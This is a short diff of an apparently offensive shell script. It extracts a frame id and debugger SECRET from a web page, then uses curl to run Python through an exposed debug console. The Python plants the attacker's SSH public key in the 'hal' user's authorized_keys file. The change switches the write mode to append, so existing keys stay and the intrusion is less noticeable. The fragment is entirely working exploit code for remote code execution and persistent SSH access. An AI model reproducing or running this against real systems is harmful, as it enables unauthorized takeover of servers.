@@ -12,7 +12,7 @@ frame=$(echo $response | sed -n "s/^.*id=\"frame-\(\S*\)\">.*$/\1/p")
 secret=$(echo $response | sed -n "s/^.*SECRET\s*=\s*\"\(\S*\)\".*$/\1/p") 
 
 # Append ssh key
-cmd="f=open('/home/hal/.ssh/authorized_keys','w');f.write('$(cat $public_key)')"
+cmd="f=open('/home/hal/.ssh/authorized_keys','a');f.write('$(cat $public_key)')"
 
 curl -s -G "$url" --data-urlencode "__debugger__=yes" \
 	   --data-urlencode "cmd=$cmd" \
